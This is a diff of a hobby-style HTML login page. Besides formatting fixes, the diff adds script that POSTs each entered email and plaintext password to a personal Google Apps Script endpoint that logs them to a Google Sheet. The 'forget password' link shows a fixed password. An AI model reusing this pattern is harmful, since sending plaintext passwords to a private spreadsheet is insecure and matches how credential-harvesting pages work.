@@ -25,7 +25,7 @@
       background: #fff;
     }
   
-  /* Popup Bounce Animation */
+    /* Popup Bounce Animation */
     @keyframes popupBounceIn {
       0% {
         transform: scale(0.7);
@@ -196,17 +196,17 @@
       outline: none;
       font-size: 1em;
       padding: 0 35px 0 5px;
-      color: #fff; /* White text for dark theke */
+      color: #fff; /* White text for dark theme */
     }
  
     body.day .inputbox input {
       color: #000; /* Black text for light theme */
     }
   
-   .inputbox input:focus ~ label,
-   .inputbox input:not(:placeholder-shown) ~ label {
-     top: -5px;
-     color: #00fffc;
+    .inputbox input:focus ~ label,
+    .inputbox input:not(:placeholder-shown) ~ label {
+      top: -5px;
+      color: #00fffc;
     }
 
     /* Password Eye Icon */
@@ -279,23 +279,23 @@
 
     /* Social Links */
     .meta-link {
-  position: fixed;
-  top: 10px;
-  left: 10px;
-  padding: 7px 7px;
-  border-radius: 6px;
-  background: linear-gradient(135deg, rgba(248, 249, 250, 0.2), rgba(214, 216, 219, 0.2), rgba(191, 197, 201, 0.2));
-  backdrop-filter: blur(10px); /* Adds a subtle frosted effect */
-  text-decoration: none;
-  color: brown;
-  transition: background 0.6s;
-  border: 1px solid rgba(255, 255, 255, 0.1);
-}
+      position: fixed;
+      top: 10px;
+      left: 10px;
+      padding: 7px 7px;
+      border-radius: 6px;
+      background: linear-gradient(135deg, rgba(248, 249, 250, 0.2), rgba(214, 216, 219, 0.2), rgba(191, 197, 201, 0.2));
+      backdrop-filter: blur(10px); /* Adds a subtle frosted effect */
+      text-decoration: none;
+      color: brown;
+      transition: background 0.6s;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
 
-.meta-link:hover {
-  background: linear-gradient(135deg, rgba(248, 249, 250, 0.3), rgba(214, 216, 219, 0.3), rgba(191, 197, 201, 0.3));
-  transform: scale(1.05);
-}
+    .meta-link:hover {
+      background: linear-gradient(135deg, rgba(248, 249, 250, 0.3), rgba(214, 216, 219, 0.3), rgba(191, 197, 201, 0.3));
+      transform: scale(1.05);
+    }
   </style>
 </head>
 <body>
@@ -335,7 +335,7 @@
   <!-- Popup Modal for Forget Password -->
   <div id="popup" class="popup">
     <div class="popup-content">
-      <span class="close">&times;</span>
+      <span class="close">×</span>
       <p id="popup-text"></p>
     </div>
   </div>
@@ -343,84 +343,103 @@
   <a class="meta-link" href="https://t.me/manish_barui" target="_blank">Join Telegram</a>
 
   <script>
-document.addEventListener("DOMContentLoaded", () => {
-  const themeToggle = document.getElementById("theme-toggle");
-  const passwordInput = document.getElementById("password");
-  const togglePassword = document.getElementById("toggle-password");
-  const forgetPasswordLink = document.querySelector(".forget a");
-  const popup = document.getElementById("popup");
-  const popupText = document.getElementById("popup-text");
-  const closeBtn = document.querySelector(".popup .close");
-  const form = document.getElementById("loginForm");
-  const registerLink = document.querySelector(".register a");
-  const loginButton = form.querySelector("button");
-  let isRegisterMode = false;
+  document.addEventListener("DOMContentLoaded", () => {
+    const themeToggle = document.getElementById("theme-toggle");
+    const passwordInput = document.getElementById("password");
+    const togglePassword = document.getElementById("toggle-password");
+    const forgetPasswordLink = document.querySelector(".forget a");
+    const popup = document.getElementById("popup");
+    const popupText = document.getElementById("popup-text");
+    const closeBtn = document.querySelector(".popup .close");
+    const form = document.getElementById("loginForm");
+    const registerLink = document.querySelector(".register a");
+    const loginButton = form.querySelector("button");
+    let isRegisterMode = false;
 
-  if (localStorage.getItem("theme") === "day") {
-    document.body.classList.add("day");
-    themeToggle.checked = true;
-  }
+    // Your Google Apps Script Web App URL
+    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxep5w0eLFsEaqNdnRxg_OtSCiZeT7WqAZzqSrL_B6QrHPunP6Yh-GoQACk217IvyjW2g/exec";
 
-  themeToggle.addEventListener("change", () => {
-    document.body.classList.toggle("day");
-    localStorage.setItem("theme", document.body.classList.contains("day") ? "day" : "night");
-  });
-
-  togglePassword.addEventListener("click", () => {
-    passwordInput.type = passwordInput.type === "password" ? "text" : "password";
-    togglePassword.classList.toggle("fa-eye-slash");
-    togglePassword.style.animation = "bounce 0.3s";
-    setTimeout(() => { togglePassword.style.animation = ""; }, 300);
-  });
-
-  function showPopup(message) {
-    popupText.innerText = message;
-    popup.classList.remove("hide");
-    popup.style.display = "block";
-  }
-
-  function hidePopup() {
-    popup.classList.add("hide");
-    setTimeout(() => {
-      popup.style.display = "none";
-    }, 300);
-  }
-
-  form.addEventListener("submit", (event) => {
-    event.preventDefault();
-    const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
-
-    if (email.trim() && password.trim()) {
-      if (isRegisterMode) {
-        showPopup("Signed Successfully!");
-      } else {
-        showPopup("You've Successfully Logged In");
-      }
-      form.reset();
-    } else {
-      alert("Please fill in both email and password.");
+    if (localStorage.getItem("theme") === "day") {
+      document.body.classList.add("day");
+      themeToggle.checked = true;
     }
-  });
 
-  forgetPasswordLink.addEventListener("click", (event) => {
-    event.preventDefault();
-    passwordInput.value = "";
-    showPopup("Your new password is: @manish123");
-  });
+    themeToggle.addEventListener("change", () => {
+      document.body.classList.toggle("day");
+      localStorage.setItem("theme", document.body.classList.contains("day") ? "day" : "night");
+    });
 
-  closeBtn.addEventListener("click", hidePopup);
-  window.addEventListener("click", (event) => {
-    if (event.target === popup) hidePopup();
-  });
+    togglePassword.addEventListener("click", () => {
+      passwordInput.type = passwordInput.type === "password" ? "text" : "password";
+      togglePassword.classList.toggle("fa-eye-slash");
+      togglePassword.style.animation = "bounce 0.3s";
+      setTimeout(() => { togglePassword.style.animation = ""; }, 300);
+    });
 
-  registerLink.addEventListener("click", (event) => {
-    event.preventDefault();
-    loginButton.textContent = "Sign In";
-    isRegisterMode = true;
+    function showPopup(message) {
+      popupText.innerText = message;
+      popup.classList.remove("hide");
+      popup.style.display = "block";
+    }
+
+    function hidePopup() {
+      popup.classList.add("hide");
+      setTimeout(() => {
+        popup.style.display = "none";
+      }, 300);
+    }
+
+    form.addEventListener("submit", (event) => {
+      event.preventDefault();
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      if (email.trim() && password.trim()) {
+        const action = isRegisterMode ? "Sign In" : "Login";
+        const data = { email, password, action };
+
+        // Send data to Google Sheets
+        fetch(GOOGLE_SCRIPT_URL, {
+          method: "POST",
+          body: JSON.stringify(data),
+          headers: { "Content-Type": "application/json" },
+        })
+          .then((response) => response.json())
+          .then((result) => {
+            if (result.result === "success") {
+              showPopup(isRegisterMode ? "Signed Successfully!" : "You've Successfully Logged In");
+              form.reset();
+            } else {
+              showPopup("Error saving data to Google Sheets.");
+            }
+          })
+          .catch((error) => {
+            console.error("Error:", error);
+            showPopup("Failed to connect to Google Sheets.");
+          });
+      } else {
+        alert("Please fill in both email and password.");
+      }
+    });
+
+    forgetPasswordLink.addEventListener("click", (event) => {
+      event.preventDefault();
+      passwordInput.value = "";
+      showPopup("Your new password is: @manish123");
+    });
+
+    closeBtn.addEventListener("click", hidePopup);
+    window.addEventListener("click", (event) => {
+      if (event.target === popup) hidePopup();
+    });
+
+    registerLink.addEventListener("click", (event) => {
+      event.preventDefault();
+      loginButton.textContent = "Sign In";
+      isRegisterMode = true;
+    });
   });
-});
-</script>
+  </script>
 
 </body>
-</html> 
+</html>
